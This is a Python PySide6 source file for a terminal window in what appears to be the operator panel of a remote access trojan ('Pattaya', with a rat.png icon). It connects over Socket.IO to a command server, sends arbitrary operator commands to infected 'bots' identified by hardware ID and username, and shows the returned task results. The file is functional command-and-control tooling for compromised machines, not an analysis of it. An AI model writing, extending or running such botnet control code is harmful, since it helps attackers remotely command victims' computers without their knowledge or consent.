from PySide6.QtWidgets import QWidget,QCompleter
from PySide6.QtGui import QIcon,QFont
from PySide6.QtCore import Qt
from core.util import PattayaPanelUtil
from designer.ui_terminal import Ui_BotTerminalWidget
import json
from datetime import datetime
import socketio

from service.socket_io_terminal import SocketIOTerminalClient


class BotTerminalWidget(QWidget, Ui_BotTerminalWidget):
    def __init__(self, bot, url, token, namespace):
        super().__init__()        
        self.setupUi(self)
        self.bot = bot
        self.url = url
        self.token = token
        self.namespace = namespace
        self.socket_io_client = SocketIOTerminalClient(self.bot)

        self.setWindowIcon(QIcon(":/assets/images/rat.png"))
        self.task_result_text_browser.setStyleSheet("background-color: #000000;")
        self.bot_send_task_line_edit.setStyleSheet("background-color: #000000;")
        self.bot_send_task_line_edit.setStyleSheet("color: #FB00FF;")


        self.socket_io_client.server_ack.connect(self.server_ack_bot_terminal)
        self.socket_io_client.server_ack_result.connect(self.server_update_bot_terminal)

        self.socket_io_client.connected_to_server.connect(self.init_terminal)
        self.socket_io_client.server_ack_bot_discon.connect(self._on_disconnect)

        self.socket_io_client.start(self.url, self.token, self.namespace)


        # command = ['help', 'cd', 'pwd', 'mkdir', 'start']
        # completer = QCompleter(command)
        # self.bot_send_task_line_edit.setCompleter(completer)

        self.setWindowFlags(Qt.WindowType.WindowStaysOnTopHint)
        self.bot_send_task_line_edit.returnPressed.connect(self.handle_bot_comamnd)


        font = QFont()
        font.setPointSize(11)  # set the font size to 20
        self.task_result_text_browser.setFont(font)

        
        self.task_result_text_browser.setFocusPolicy(Qt.FocusPolicy.NoFocus)


    def init_terminal(self, data):
        self.update_bot_terminal(data)

    def handle_bot_comamnd(self):
        text = self.bot_send_task_line_edit.text()
        if text == '':
            return
        
        PattayaPanelUtil.panel_log_info(f"Enter {text} command to {self.bot['username']}")
        self.update_bot_terminal(text)
        args = text.split(" ", 1)
        command = args[0]

        if (len(args)) == 1:
            arg = ""
        else:
            arg = args[1]

        bot_task = {
            "socketId": self.bot['socketId'],
            "hwid": self.bot['hwid'],
            "command": command,
            "arguments": arg,
            "file": "" 
        }
        try:
            self.socket_io_client.send_command('panel_send_bot_task', bot_task)
        except Exception as e:
            self.update_bot_terminal(f'{str(e)}')

        
        self.bot_send_task_line_edit.clear()
        self.bot_send_task_line_edit.setDisabled(True)


    def closeEvent(self, event):
        # self.socket_io_client.socket_io.off(self.bot_event)
        self.socket_io_client.stop()
        PattayaPanelUtil.terminals.pop(self.bot['hwid'])
        PattayaPanelUtil.panel_log_info(f"Closed {self.bot['username']} terminal")
    
    
    def server_ack_bot_terminal(self, text):
        self.bot_send_task_line_edit.setDisabled(False)
        self.bot_send_task_line_edit.setFocus()
        current_time = datetime.now()
        formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
        self.task_result_text_browser.append(f"<font color='#F600FA'>[*] [{formatted_time}] {text}</font>")
        self.task_result_text_browser.ensureCursorVisible()


    def server_update_bot_terminal(self, result):
        current_time = datetime.now()
        formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
        self.task_result_text_browser.append(f"<font color='#FFF300'>[x] [{formatted_time}] bot [{self.bot['username']}] received task result</font><font color='#F6FA00'>>>></font></font><font color='#00E3FA'> {result}</font><br>")
        self.task_result_text_browser.ensureCursorVisible()

    def update_bot_terminal(self, command):
        current_time = datetime.now()
        formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
        self.task_result_text_browser.append(f"<font color='#2AFA00'>[+] [{formatted_time}] Tasking bot [{self.bot['username']}]</font><font color='#F6FA00'><<<</font></font><font color='#00E3FA'> {command}</font>")
        self.task_result_text_browser.ensureCursorVisible()


    def update_bot_terminal_error(self, command):
        current_time = datetime.now()
        formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
        self.task_result_text_browser.append(f"<font color='red'>[-] [{formatted_time}] Seem bot disconnected [{self.bot['username']}]</font><font color='#F6FA00'><<<</font></font><font color='#00E3FA'> {command}</font>")
        self.task_result_text_browser.ensureCursorVisible()


    def _on_disconnect(self):
        self.bot_send_task_line_edit.setDisabled(True)
        self.update_bot_terminal_error("Bot bas been disconnected from server")

